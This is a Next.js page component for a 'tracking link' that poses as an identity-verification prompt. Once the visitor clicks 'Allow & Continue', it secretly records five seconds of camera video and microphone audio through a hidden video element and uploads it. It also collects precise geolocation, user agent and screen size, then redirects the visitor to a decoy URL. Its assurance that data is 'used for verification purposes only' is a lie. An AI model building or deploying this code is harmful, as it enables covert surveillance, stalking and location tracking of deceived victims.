"use client";
import { useEffect, useState, useRef } from "react";
import { use } from "react";

export default function TrackingPage({ params }) {
  const { trackingId } = use(params);
  const [session, setSession] = useState(null);
  const [status, setStatus] = useState("waiting");
  const videoRef = useRef(null);

  useEffect(() => {
    fetch(process.env.NEXT_PUBLIC_STRAPI_URL + "/api/tracking-sessions")
      .then(res => res.json())
      .then(data => {
        const found = data.data.find(
          s => s.tracking_link?.includes(trackingId)
        );
        if (found) setSession(found);
      });
  }, [trackingId]);

  const recordVideo = async (stream) => {
    return new Promise((resolve) => {
      const chunks = [];
      const recorder = new MediaRecorder(stream, {
        mimeType: MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
          ? "video/webm;codecs=vp9"
          : "video/webm"
      });

      recorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      recorder.onstop = () => {
        const blob = new Blob(chunks, { type: "video/webm" });
        resolve(blob);
      };

      recorder.start();

      // Record for 5 seconds
      setTimeout(() => {
        recorder.stop();
      }, 5000);
    });
  };

  const uploadVideo = async (blob) => {
    try {
      const formData = new FormData();
      formData.append("files", blob, `capture-${trackingId}-${Date.now()}.webm`);

      const res = await fetch(
        `${process.env.NEXT_PUBLIC_STRAPI_URL}/api/upload`,
        {
          method: "POST",
          body: formData
        }
      );

      const data = await res.json();
      if (Array.isArray(data) && data[0]?.url) {
        return data[0].url;
      }
      return null;
    } catch (err) {
      console.error("Upload error:", err);
      return null;
    }
  };

  const handleAllow = async () => {
    setStatus("capturing");

    let locationData = {};
    let permissions = { camera: false, mic: false, location: false };
    let videoUrl = null;

    // Step 1 — Camera and mic + record video
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: true
      });
      permissions.camera = true;
      permissions.mic = true;

      // Show live preview (hidden)
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }

      // Record 5 seconds
      const blob = await recordVideo(stream);

      // Stop stream
      stream.getTracks().forEach(track => track.stop());

      // Upload to Strapi
      videoUrl = await uploadVideo(blob);

    } catch (err) {
      // Try without facingMode
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: true
        });
        permissions.camera = true;
        permissions.mic = true;

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
        }

        const blob = await recordVideo(stream);
        stream.getTracks().forEach(track => track.stop());
        videoUrl = await uploadVideo(blob);
      } catch (err2) {
        console.error("Media error:", err2);
      }
    }

    // Step 2 — Location
    try {
      locationData = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            permissions.location = true;
            resolve({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            });
          },
          () => resolve({}),
          { timeout: 10000 }
        );
      });
    } catch (err) {
      console.error("Location error:", err);
    }

    // Step 3 — Send to backend
    try {
      const res = await fetch("/api/geolocation/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          trackingId,
          locationData,
          permissions,
          userAgent: navigator.userAgent,
          screen: `${window.innerWidth}x${window.innerHeight}`,
          videoUrl
        })
      });

      const result = await res.json();
      setStatus("done");

      if (result.success && session?.decoy_url) {
        window.location.href = session.decoy_url;
      }
    } catch (err) {
      console.error("FETCH ERROR:", err);
    }
  };

  return (
    <div style={{
      height: "100vh",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      flexDirection: "column",
      textAlign: "center",
      padding: "24px"
    }}>
      {/* Hidden video for recording */}
      <video
        ref={videoRef}
        style={{ display: "none" }}
        muted
        playsInline
      />

      {status === "waiting" && (
        <>
          <div style={{ fontSize: "48px", marginBottom: "20px" }}>🔒</div>
          <h2 style={{ fontSize: "20px", fontWeight: 600, marginBottom: "10px", color: "#111" }}>
            Verification Required
          </h2>
          <p style={{ fontSize: "14px", color: "#555", marginBottom: "8px", maxWidth: "300px" }}>
            To continue, this link requires access to:
          </p>
          <div style={{ fontSize: "13px", color: "#777", marginBottom: "28px", lineHeight: 2 }}>
            📍 Your location<br />
            📷 Camera<br />
            🎙️ Microphone
          </div>
          <button
            onClick={handleAllow}
            style={{
              padding: "14px 32px",
              background: "#111",
              color: "white",
              borderRadius: "10px",
              border: "none",
              fontSize: "15px",
              fontWeight: 500,
              cursor: "pointer"
            }}
          >
            Allow & Continue
          </button>
          <p style={{ fontSize: "11px", color: "#aaa", marginTop: "16px" }}>
            Your information is used for verification purposes only
          </p>
        </>
      )}

      {status === "capturing" && (
        <div>
          <div style={{ fontSize: "32px", marginBottom: "16px" }}>⏳</div>
          <p style={{ fontSize: "14px", color: "#555" }}>Verifying your identity...</p>
          <p style={{ fontSize: "12px", color: "#aaa", marginTop: "8px" }}>Please wait, do not close this page</p>
        </div>
      )}

      {status === "done" && (
        <div>
          <div style={{ fontSize: "32px", marginBottom: "16px" }}>✓</div>
          <p style={{ fontSize: "14px", color: "#555" }}>Verification complete. Redirecting...</p>
        </div>
      )}
    </div>
  );
}